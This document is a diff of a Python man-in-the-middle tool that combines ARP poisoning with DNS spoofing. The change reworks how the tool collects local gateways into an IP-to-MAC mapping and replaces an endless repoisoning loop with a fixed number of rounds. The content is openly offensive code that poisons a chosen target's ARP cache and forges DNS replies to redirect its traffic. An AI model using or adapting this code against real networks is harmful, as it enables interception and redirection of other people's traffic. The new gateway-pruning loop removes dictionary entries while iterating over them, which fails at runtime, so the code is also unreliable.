@@ -3,6 +3,7 @@ import netifaces as ni
 import time
 import re
 
+# import other files from project
 import search_hosts as sh
 import arp_spoofing as arp
 import spoofing_tool as spoof
@@ -49,16 +50,23 @@ def dns_spoofing(gratuitious, verbose):
     target = spoof.validate_ip(active_hosts, [], previous_tuples)
 
     # Get the IP addresses of the default gateways of the selected interface
-    gateways = []
+    gateways = {}
+    GATEWAY_TOKEN = "ff:ff:ff:ff:ff:ff"
     for key, val in ni.gateways()["default"].items():
         if val[1] == iface:
-            gateways.append(str(val[0]))
+            gateways[str(val[0])] = GATEWAY_TOKEN
 
     for host in active_hosts:
         if host["ip"] in gateways:
+            gateways[host["ip"]] = host["mac"]
+
             for scnd_host in active_hosts:
                 if scnd_host["mac"] == host["mac"] and scnd_host["ip"] not in gateways:
-                    gateways.append(scnd_host["ip"])
+                    gateways[scnd_host["ip"]] = scnd_host["mac"]
+
+    for gw_ip, gw_mac in gateways.items():
+        if gw_mac == GATEWAY_TOKEN:
+            gateways.pop(gw_ip)                
 
     previous_tuples = []
     to_print = "Chosen target IP address: " + target["ip"]
@@ -80,7 +88,7 @@ def dns_spoofing(gratuitious, verbose):
 
     # Start ARP poisoning
     my_addresses = sh.get_my_details(iface)
-    for gw_ip in gateways:
+    for gw_ip, gw_mac in gateways.items():
         arp.one_way_arp_start(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface)
 
     spoof.printf("Poisoning initiated.", 4)
@@ -88,7 +96,7 @@ def dns_spoofing(gratuitious, verbose):
     dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts, gratuitious, END_POISON)
 
     # end poisoning
-    for gw_ip in gateways:
+    for gw_ip, gw_mac in gateways.items():
         for host in active_hosts:
             if host['ip'] == gw_ip:
                 arp.one_way_arp_end(target["mac"], target["ip"], host['mac'], host['ip'], my_addresses['mac'], my_addresses['ip'], iface)
@@ -175,24 +183,18 @@ def is_IP_valid(active_hosts, ip_address):
 def dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts, gratuitious, end_poison):
         #last_poison_time = time.time() - REPOISON_TIME
         #_filter = "udp and tcp"
+        #_filter = "host " + target["ip"]
 
-        while True:
+        for i in range(end_poison):
             # sniff for 1 packet that adheres to the {_filter}
             sniff(prn=process_udp_pkt(target, iface, dns_hosts, my_addresses), store=0, timeout=REPOISON_TIME)   
             
             # {REPOISON_TIME} seconds have passed => should repoison
-            #current_time = time.time()
-            #if current_time - last_poison_time > REPOISON_TIME - 0.5:
             repoison(my_addresses, gateways, target, iface, gratuitious)
-                #last_poison_time = current_time
-            end_poison -= 1
-
-            if end_poison < 1:
-                break
 
 def repoison(my_addresses, gateways, target, iface, gratuitious):
     spoof.printf("Repoisoning", 4)
-    for gw_ip in gateways:
+    for gw_ip, gw_mac in gateways.items():
         arp.one_way_arp(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface, 2, gratuitious)
 
 def process_udp_pkt(target, iface, dns_hosts, my_addresses):
